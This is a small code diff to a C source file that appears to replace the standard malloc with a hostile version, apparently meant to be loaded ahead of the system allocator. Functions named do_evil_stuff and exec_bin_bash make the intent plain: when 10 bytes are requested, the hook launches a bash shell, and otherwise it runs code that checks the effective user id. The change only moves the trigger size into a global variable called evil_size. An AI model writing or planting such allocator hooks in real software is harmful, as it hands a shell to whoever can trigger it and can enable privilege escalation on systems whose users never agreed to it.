@@ -20,6 +20,9 @@ void *calloc(size_t nmemb, size_t size);
 uid_t geteuid(void);
 uid_t geteuid(void);
 
+/* global */
+size_t evil_size = 10;
+
 static void do_evil_stuff(void)
 {
 	uid_t e_uid;
@@ -42,7 +45,7 @@ void exec_bin_bash(void)
 
 void *malloc(size_t size)
 {
-	if (size == 10) {
+	if (size == evil_size) {
 		exec_bin_bash();
 	} else {
 		do_evil_stuff();
